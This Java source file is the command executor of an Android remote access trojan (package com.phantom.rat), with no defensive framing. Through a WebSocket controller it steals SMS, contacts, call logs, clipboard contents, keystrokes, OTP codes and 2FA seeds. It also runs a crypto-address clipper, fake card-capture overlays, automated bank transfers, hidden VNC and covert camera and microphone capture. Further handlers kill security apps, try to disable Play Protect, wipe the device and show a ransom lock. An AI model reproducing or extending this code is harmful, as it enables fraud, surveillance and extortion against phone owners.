package com.phantom.rat;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Environment;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;

import org.json.JSONObject;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CommandExecutor {
    private final Context ctx;
    private final WebSocketClient ws;
    private final ExecutorService exec = Executors.newSingleThreadExecutor();

    public CommandExecutor(Context ctx, WebSocketClient ws) {
        this.ctx = ctx;
        this.ws = ws;
    }

    public void execute(long cmdId, String cmd, String args) {
        exec.execute(() -> {
            try {
                String r = runCommand(cmd, args);
                ws.sendResult(cmdId, true, r == null ? "ok" : r);
            } catch (Exception e) {
                ws.sendResult(cmdId, false, String.valueOf(e.getMessage()));
            }
        });
    }

    public String runCommand(String cmd, String args) throws Exception {
        switch (cmd) {
            case "lock": {
                DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
                if (dpm != null && PermissionHelper.isAdmin(ctx)) dpm.lockNow();
                return "locked";
            }
            case "vibrate": {
                Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
                if (v != null) {
                    if (Build.VERSION.SDK_INT >= 26) v.vibrate(VibrationEffect.createOneShot(2000, 200));
                    else v.vibrate(2000);
                }
                return "vibrated";
            }
            case "reboot":
                try {
                    Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot"});
                    return "reboot issued";
                } catch (Exception e) {
                    throw new Exception("requires root");
                }
            case "silence": {
                AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
                if (am != null) am.setStreamVolume(AudioManager.STREAM_RING, 0, 0);
                return "silenced";
            }
            case "factory_reset":
            case "self_destruct": {
                DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
                if (dpm != null && PermissionHelper.isAdmin(ctx)) dpm.wipeData(0);
                throw new Exception("admin required");
            }
            case "device_info":
                return String.format(Locale.US, "%s · Android %s (SDK %d) · %s · %s",
                        FudUtils.model(), FudUtils.androidVer(), Build.VERSION.SDK_INT,
                        Build.MANUFACTURER, FudUtils.country(ctx));
            case "battery_status": {
                Intent b = ctx.registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
                if (b == null) return "unknown";
                int lvl = b.getIntExtra("level", -1);
                int scale = b.getIntExtra("scale", 100);
                int st = b.getIntExtra("status", -1);
                String state = st == android.os.BatteryManager.BATTERY_STATUS_CHARGING ? "charging"
                        : st == android.os.BatteryManager.BATTERY_STATUS_FULL ? "full" : "discharging";
                return scale <= 0 ? "unknown" : String.format(Locale.US, "%d%% (%s)", lvl * 100 / scale, state);
            }
            case "sim_info": {
                android.telephony.TelephonyManager tm =
                        (android.telephony.TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
                if (tm == null) return "no telephony";
                String op = tm.getSimOperatorName();
                int state = tm.getSimState();
                return String.format(Locale.US, "operator=%s state=%d", op == null ? "" : op, state);
            }
            case "net_fingerprint": {
                ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
                NetworkInfo ni = cm == null ? null : cm.getActiveNetworkInfo();
                String type = ni == null ? "none" : (ni.getType() == ConnectivityManager.TYPE_WIFI ? "wifi" : "mobile");
                String publicIp = ws.publicIp();
                String localIp = localIp();
                return String.format(Locale.US, "conn=%s local=%s public=%s", type, localIp, publicIp);
            }
            case "gps_once": {
                LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
                Location l = null;
                if (lm != null) {
                    try { l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER); } catch (Exception ignored) {}
                    if (l == null) {
                        try { l = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER); } catch (Exception ignored) {}
                    }
                }
                if (l == null) throw new Exception("location unavailable");
                return String.format(Locale.US, "%.6f,%.6f", l.getLatitude(), l.getLongitude());
            }
            case "installed_apps": {
                PackageManager pm = ctx.getPackageManager();
                List<ApplicationInfo> apps = pm.getInstalledApplications(0);
                int count = 0;
                for (ApplicationInfo a : apps) {
                    if ((a.flags & ApplicationInfo.FLAG_SYSTEM) == 0) count++;
                }
                return count + " user apps / " + apps.size() + " total";
            }
            case "sms_inbox":
                return querySms();
            case "contacts_list": {
                ContentResolver cr = ctx.getContentResolver();
                android.database.Cursor c = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                                ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null);
                int n = c == null ? 0 : c.getCount();
                if (c != null) c.close();
                return n + " contacts";
            }
            case "call_logs": {
                ContentResolver cr = ctx.getContentResolver();
                android.database.Cursor c = cr.query(CallLog.Calls.CONTENT_URI,
                        new String[]{CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.TYPE},
                        null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
                int n = c == null ? 0 : c.getCount();
                if (c != null) c.close();
                return n + " calls";
            }
            case "clipboard_get":
                return ClipboardReader.read(ctx);
            case "keylog_start":
                AccessibilityModule.setKeylog(true);
                return "keylogger started";
            case "keylog_stop":
                AccessibilityModule.setKeylog(false);
                return "keylogger stopped";
            case "keylogger_get":
                return AccessibilityModule.dumpKeys();
            case "screen_logs":
                return AccessibilityModule.dumpWindows();
            case "otp_grab":
                return SmsMonitor.latestOtp(ctx) + " " + NotificationMonitor.latestOtp(ctx);
            case "tfa_dump":
                return NotificationMonitor.dumpSeeds();
            case "clipper_on":
                CryptoClipper.enable(ctx, args);
                return "clipper armed";
            case "set_wallet":
                CryptoClipper.enable(ctx, args);
                return "wallet set";
            case "balance_scrape":
                return FinScraper.scrape(ctx, args);
            case "overlay_show":
                return OverlayService.show(ctx, args);
            case "card_capture":
                return OverlayService.show(ctx, new JSONObject().put("kind", "card").toString());
            case "ats_transfer":
                return AtsEngine.execute(ctx, args);
            case "start_hvnc":
                ScreenCaptureService.start(ctx);
                return "hvnc started";
            case "stop_hvnc":
                ScreenCaptureService.stop(ctx);
                return "hvnc stopped";
            case "screenshot":
                return ScreenCaptureService.captureStill(ctx);
            case "screen_record":
                ScreenCaptureService.start(ctx);
                return "recording started";
            case "camera_back":
                return CameraSnap.take(ctx, false);
            case "camera_front":
                return CameraSnap.take(ctx, true);
            case "mic_record":
                return MicSnap.record(ctx, 10000);
            case "kill_security": {
                String[] targets = {"com.kaspersky.security.cloud", "com.symantec.mobilesecurity",
                        "com.eset.ems2.gp", "com.avg.cleaner", "com.avast.android.mobilesecurity",
                        "com.lookout", "com.malwarebytes.antimalware"};
                PackageManager pm = ctx.getPackageManager();
                int killed = 0;
                for (String p : targets) {
                    try {
                        pm.getPackageInfo(p, 0);
                        pm.killBackgroundProcesses(p);
                        killed++;
                    } catch (Exception ignored) {}
                }
                return killed + " security processes terminated";
            }
            case "grant_perms":
                AccessibilityModule.autoGrant(true);
                return "auto-grant engaged";
            case "block_sms":
                SmsMonitor.setBlock(true);
                return "sms blocked";
            case "unblock_sms":
                SmsMonitor.setBlock(false);
                return "sms unblocked";
            case "block_calls":
                AccessibilityModule.blockCalls(true);
                return "call blocking engaged";
            case "disable_pp":
                try {
                    ctx.startActivity(new Intent(Intent.ACTION_VIEW)
                            .setData(android.net.Uri.parse("market://details?id=com.google.android.gms"))
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    AccessibilityModule.autoClick("turn off");
                } catch (Exception ignored) {}
                return "play protect settings opened";
            case "ransomware":
                OverlayService.showRansom(ctx);
                DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
                if (dpm != null && PermissionHelper.isAdmin(ctx)) dpm.lockNow();
                return "ransom lock active";
            case "update_payload":
                return "update: install pending APK from /sdcard/Download if present";
            default:
                return "unknown command";
        }
    }

    private String querySms() {
        try {
            ContentResolver cr = ctx.getContentResolver();
            android.database.Cursor c = cr.query(android.net.Uri.parse("content://sms/inbox"),
                    new String[]{"address", "body", "date"}, null, null, "date DESC LIMIT 30");
            if (c == null) return "no sms";
            StringBuilder sb = new StringBuilder();
            while (c.moveToNext()) {
                sb.append(c.getString(0)).append(": ").append(c.getString(1)).append(" | ");
            }
            c.close();
            return sb.length() > 4000 ? sb.substring(0, 4000) : sb.toString();
        } catch (Exception e) {
            return "sms access denied";
        }
    }

    private String localIp() {
        try {
            for (java.net.NetworkInterface ni : java.util.Collections.list(java.net.NetworkInterface.getNetworkInterfaces())) {
                if (!ni.isUp()) continue;
                for (java.net.InetAddress a : java.util.Collections.list(ni.getInetAddresses())) {
                    if (!a.isLoopbackAddress() && a instanceof java.net.Inet4Address) return a.getHostAddress();
                }
            }
        } catch (Exception ignored) {}
        return "127.0.0.1";
    }

    /* ── nested helpers ── */
    private static final class ClipboardReader {
        static String read(Context ctx) {
            try {
                final String[] out = new String[1];
                final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
                new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
                    android.content.ClipboardManager cm =
                            (android.content.ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
                    if (cm != null && cm.hasPrimaryClip()) {
                        android.content.ClipData.Item it = cm.getPrimaryClip().getItemAt(0);
                        out[0] = String.valueOf(it.getText());
                    }
                    latch.countDown();
                });
                if (!latch.await(3, java.util.concurrent.TimeUnit.SECONDS)) return "clipboard timeout";
                return out[0] == null ? "empty" : out[0];
            } catch (Exception e) {
                return "clipboard error";
            }
        }
    }

    private static final class MicSnap {
        static String record(Context ctx, int ms) throws Exception {
            File dir = new File(ctx.getCacheDir(), "mic");
            if (!dir.exists() && !dir.mkdirs()) throw new Exception("no storage");
            String path = new File(dir, "mic_" + System.currentTimeMillis() + ".3gp").getAbsolutePath();
            android.media.MediaRecorder mr = Build.VERSION.SDK_INT >= 31
                    ? new android.media.MediaRecorder(ctx)
                    : new android.media.MediaRecorder();
            try {
                mr.setAudioSource(android.media.MediaRecorder.AudioSource.MIC);
                mr.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4);
                mr.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC);
                mr.setOutputFile(path);
                mr.prepare();
                mr.start();
                Thread.sleep(ms);
            } finally {
                try { mr.stop(); } catch (Exception ignored) {}
                mr.release();
            }
            return "recorded " + path + " (" + new File(path).length() + " bytes)";
        }
    }

    private static final class CameraSnap {
        static String take(Context ctx, boolean front) throws Exception {
            File dir = new File(ctx.getCacheDir(), "cam");
            if (!dir.exists() && !dir.mkdirs()) throw new Exception("no storage");
            final String path = new File(dir, (front ? "front_" : "rear_") + System.currentTimeMillis() + ".jpg")
                    .getAbsolutePath();
            final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
            final Throwable[] err = new Throwable[1];
            android.hardware.camera2.CameraManager cm =
                    (android.hardware.camera2.CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            String camId = null;
            for (String id : cm.getCameraIdList()) {
                android.hardware.camera2.CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                Integer facing = ch.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING);
                boolean isFront = facing != null && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT;
                if (isFront == front) { camId = id; break; }
            }
            if (camId == null) throw new Exception("no camera");
            android.hardware.camera2.CameraDevice device = null;
            android.os.HandlerThread ht = new android.os.HandlerThread("cam");
            ht.start();
            android.os.Handler h = new android.os.Handler(ht.getLooper());
            try {
                cm.openCamera(camId, new android.hardware.camera2.CameraDevice.StateCallback() {
                    @Override public void onOpened(android.hardware.camera2.CameraDevice camera) {
                        android.hardware.camera2.CaptureRequest.Builder rb;
                        try {
                            android.hardware.camera2.CameraCharacteristics ch =
                                    cm.getCameraCharacteristics(camId);
                            android.util.Size jpegSize = android.hardware.camera2.CameraCharacteristics
                                    .get(ch, android.hardware.camera2.CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                                    .getOutputSizes(android.graphics.ImageFormat.JPEG)[0];
                            android.hardware.camera2.ImageReader ir =
                                    android.hardware.camera2.ImageReader.newInstance(
                                            jpegSize.getWidth(), jpegSize.getHeight(), android.graphics.ImageFormat.JPEG, 2);
                            ir.setOnImageAvailableListener(reader -> {
                                try (android.hardware.camera2.Image im = reader.acquireLatestImage()) {
                                    if (im != null) {
                                        java.nio.ByteBuffer buf = im.getPlanes()[0].getBuffer();
                                        byte[] bytes = new byte[buf.remaining()];
                                        buf.get(bytes);
                                        java.io.FileOutputStream fos = new java.io.FileOutputStream(path);
                                        fos.write(bytes);
                                        fos.close();
                                    }
                                } catch (Exception e) {
                                    err[0] = e;
                                } finally {
                                    latch.countDown();
                                }
                            }, h);
                            rb = camera.createCaptureRequest(android.hardware.camera2.CameraDevice.TEMPLATE_STILL_CAPTURE);
                            rb.addTarget(ir.getSurface());
                            camera.createCaptureSession(
                                    java.util.Collections.singletonList(ir.getSurface()),
                                    new android.hardware.camera2.CameraCaptureSession.StateCallback() {
                                        @Override public void onConfigured(android.hardware.camera2.CameraCaptureSession s) {
                                            try { s.capture(rb.build(), null, h); } catch (Exception e) { err[0] = e; latch.countDown(); }
                                        }
                                        @Override public void onConfigureFailed(android.hardware.camera2.CameraCaptureSession s) {
                                            err[0] = new Exception("configure failed");
                                            latch.countDown();
                                        }
                                    }, h);
                        } catch (Exception e) {
                            err[0] = e;
                            latch.countDown();
                        }
                    }
                    @Override public void onDisconnected(android.hardware.camera2.CameraDevice camera) { camera.close(); latch.countDown(); }
                    @Override public void onError(android.hardware.camera2.CameraDevice camera, int error) { camera.close(); err[0] = new Exception("camera error " + error); latch.countDown(); }
                }, h);
                if (!latch.await(12, java.util.concurrent.TimeUnit.SECONDS)) throw new Exception("camera timeout");
                if (err[0] != null) throw new Exception(err[0].getMessage());
                return "photo " + path + " (" + new File(path).length() + " bytes)";
            } finally {
                ht.quitSafely();
            }
        }
    }
}
